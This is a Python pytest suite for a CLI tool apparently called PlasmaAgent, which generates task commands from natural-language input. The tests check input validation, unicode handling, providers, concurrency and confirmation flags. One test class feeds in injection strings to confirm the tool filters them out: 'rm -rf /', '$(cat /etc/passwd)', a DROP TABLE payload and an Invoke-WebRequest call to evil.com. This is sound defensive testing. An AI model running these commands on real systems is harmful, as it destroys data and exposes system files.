import os
import re
import subprocess
import sys
import threading
from typing import Optional

import pytest


TIMEOUT_SECONDS = 10


def run_plasma_command(
    *args: str,
    stdin_input: Optional[str] = None,
    timeout: float = TIMEOUT_SECONDS,
) -> tuple[int, str, str]:
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONUTF8"] = "1"

    cmd = [sys.executable, "-m", "plasmaagent.cli.main", *args]
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            input=stdin_input.encode("utf-8") if stdin_input else None,
            timeout=timeout,
            cwd="C:\\Users\\Dearly Febriano\\Documents\\PlasmaAgent",
            env=env,
        )
        stdout = proc.stdout.decode("utf-8", errors="replace") if proc.stdout else ""
        stderr = proc.stderr.decode("utf-8", errors="replace") if proc.stderr else ""
        return proc.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"TIMEOUT after {timeout}s"
    except ValueError as e:
        return -2, "", f"VALUE_ERROR: {e}"


def extract_generated_commands(output: str) -> list[str]:
    commands = []
    lines = output.splitlines()
    in_commands_section = False
    for line in lines:
        stripped = line.strip().strip("│").strip()
        if stripped.startswith("Commands:"):
            in_commands_section = True
            continue
        if in_commands_section:
            if stripped.startswith(("Template:", "Schedule:")):
                break
            match = re.match(r"^\d+\.\s+(.+)$", stripped)
            if match:
                commands.append(match.group(1))
    return commands


class TestEmptyInputHandling:
    def test_empty_string_input_fails_fast(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "", "--preview"
        )
        assert code != 0, f"Expected non-zero exit for empty input, got {code}"
        combined = out + err
        assert "empty" in combined.lower() or "whitespace" in combined.lower() or "error" in combined.lower()

    def test_whitespace_only_input_fails_fast(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "   ", "--preview"
        )
        assert code != 0
        combined = out + err
        assert "empty" in combined.lower() or "whitespace" in combined.lower() or "error" in combined.lower()

    def test_tab_newline_only_input_fails_fast(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "\t\n\r  ", "--preview"
        )
        assert code != 0

    def test_no_input_flag_in_non_interactive_fails(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--preview", timeout=5
        )
        assert code != 0, f"Should fail fast in non-interactive mode, got {code}"
        combined = out + err
        assert "interactive" in combined.lower() or "input" in combined.lower() or "error" in combined.lower()


class TestInputLengthLimits:
    def test_reasonable_length_accepted(self):
        reasonable_input = "backup database postgresql plasmaagent " + ("x" * 200)
        code, out, err = run_plasma_command(
            "task", "generate", "--input", reasonable_input, "--preview"
        )
        combined = out + err
        assert "too long" not in combined.lower()

    def test_very_long_input_rejected(self):
        huge_input = "backup database " + ("x" * 15000)
        code, out, err = run_plasma_command(
            "task", "generate", "--input", huge_input, "--preview"
        )
        assert code != 0
        combined = out + err
        assert "too long" in combined.lower() or "maximum" in combined.lower() or "error" in combined.lower()

    def test_boundary_just_under_limit(self):
        input_just_under = "backup database " + ("x" * 9900)
        code, out, err = run_plasma_command(
            "task", "generate", "--input", input_just_under, "--preview"
        )
        combined = out + err
        assert "too long" not in combined.lower()


class TestSecurityEdgeCases:
    def test_sql_injection_not_in_generated_commands(self):
        malicious = "backup database'; DROP TABLE tasks;--"
        code, out, err = run_plasma_command(
            "task", "generate", "--input", malicious, "--preview"
        )
        combined = out + err
        commands = extract_generated_commands(combined)
        for cmd in commands:
            assert "DROP TABLE" not in cmd, f"SQL injection leaked into command: {cmd}"
            assert "'; " not in cmd, f"SQL injection leaked into command: {cmd}"

    def test_shell_injection_not_in_generated_commands(self):
        malicious = "backup database && rm -rf /"
        code, out, err = run_plasma_command(
            "task", "generate", "--input", malicious, "--preview"
        )
        combined = out + err
        commands = extract_generated_commands(combined)
        for cmd in commands:
            assert "rm -rf" not in cmd, f"Shell injection leaked into command: {cmd}"
            assert "&&" not in cmd, f"Shell injection leaked into command: {cmd}"

    def test_command_substitution_attempt(self):
        malicious = "backup $(cat /etc/passwd) database"
        code, out, err = run_plasma_command(
            "task", "generate", "--input", malicious, "--preview"
        )
        combined = out + err
        commands = extract_generated_commands(combined)
        for cmd in commands:
            assert "cat /etc/passwd" not in cmd

    def test_backtick_injection(self):
        malicious = "backup `whoami` database"
        code, out, err = run_plasma_command(
            "task", "generate", "--input", malicious, "--preview"
        )
        combined = out + err
        commands = extract_generated_commands(combined)
        for cmd in commands:
            assert "`" not in cmd or "Get-Date" in cmd

    def test_powershell_injection(self):
        malicious = "backup database; Invoke-WebRequest http://evil.com"
        code, out, err = run_plasma_command(
            "task", "generate", "--input", malicious, "--preview"
        )
        combined = out + err
        commands = extract_generated_commands(combined)
        for cmd in commands:
            assert "Invoke-WebRequest" not in cmd
            assert "evil.com" not in cmd


class TestUnicodeAndSpecialCharacters:
    def test_unicode_japanese(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "データベースをバックアップ", "--preview"
        )
        assert code in (0, 1)

    def test_unicode_chinese(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "备份数据库", "--preview"
        )

    def test_unicode_arabic(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "نسخ احتياطي لقاعدة البيانات", "--preview"
        )

    def test_mixed_unicode_and_ascii(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database plasmaagent", "--preview"
        )
        assert code == 0

    def test_path_with_spaces(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "cleanup files in C:\\Temp", "--preview"
        )
        assert code == 0


class TestInvalidProvider:
    def test_nonexistent_provider_rejected(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database", "--provider", "nonexistent_provider_xyz", "--preview"
        )
        assert code != 0
        combined = out + err
        assert "nonexistent_provider_xyz" in combined or "provider" in combined.lower()

    def test_valid_provider_works(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database", "--provider", "rule_based", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "rule_based" in combined


class TestValidPatternsStillWork:
    def test_backup_pattern(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database postgresql plasmaagent", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "Backup" in combined
        assert "plasmaagent" in combined

    def test_cleanup_pattern(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "cleanup old files in C:\\Temp", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "Cleanup" in combined

    def test_disk_pattern(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "check disk space on D:", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "Disk" in combined

    def test_git_pattern(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "git commit changes", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "Git" in combined

    def test_system_info_pattern(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "show system info", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "System" in combined


class TestNonMatchingInputs:
    def test_random_gibberish(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "xyzabc123 random words that mean nothing", "--preview"
        )
        assert code != 0
        combined = out + err
        assert "could not" in combined.lower() or "error" in combined.lower()

    def test_single_word(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "hello", "--preview"
        )
        assert code != 0

    def test_question(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "how are you?", "--preview"
        )
        assert code != 0


class TestConcurrencySafety:
    def test_concurrent_generations(self):
        results = []

        def run_generation(idx: int) -> None:
            code, out, err = run_plasma_command(
                "task", "generate", "--input", "backup database plasmaagent", "--preview"
            )
            results.append((idx, code, out, err))

        threads = [threading.Thread(target=run_generation, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=TIMEOUT_SECONDS * 2)

        assert len(results) == 5
        for idx, code, out, err in results:
            assert code == 0, f"Thread {idx} failed: code={code}, err={err}"


class TestDeleteWithoutForce:
    def test_delete_without_force_in_non_interactive_fails(self):
        code, out, err = run_plasma_command(
            "task", "delete", "--id", "00000000-0000-0000-0000-000000000000",
            timeout=5,
        )
        assert code != 0, "Should fail fast without --force in non-interactive mode"
        combined = out + err
        assert "force" in combined.lower() or "interactive" in combined.lower() or "error" in combined.lower()

    def test_delete_with_force_proceeds(self):
        code, out, err = run_plasma_command(
            "task", "delete", "--id", "00000000-0000-0000-0000-000000000000", "--force",
        )
        combined = out + err
        assert "not found" in combined.lower() or code == 0


class TestGenerateWithoutYes:
    def test_generate_without_yes_in_non_interactive_fails(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database postgresql",
            timeout=5,
        )
        assert code != 0, "Should fail without --yes in non-interactive mode"
        combined = out + err
        assert "yes" in combined.lower() or "interactive" in combined.lower() or "force" in combined.lower()

    def test_generate_with_preview_no_yes_needed(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "backup database postgresql", "--preview"
        )
        assert code == 0
        combined = out + err
        assert "Backup" in combined

    def test_generate_with_yes_flag_creates_task(self):
        code, out, err = run_plasma_command(
            "task", "generate", "--input", "show system info", "--yes"
        )
        assert code == 0
        combined = out + err
        assert "System" in combined
        assert "Created" in combined or "PENDING" in combined
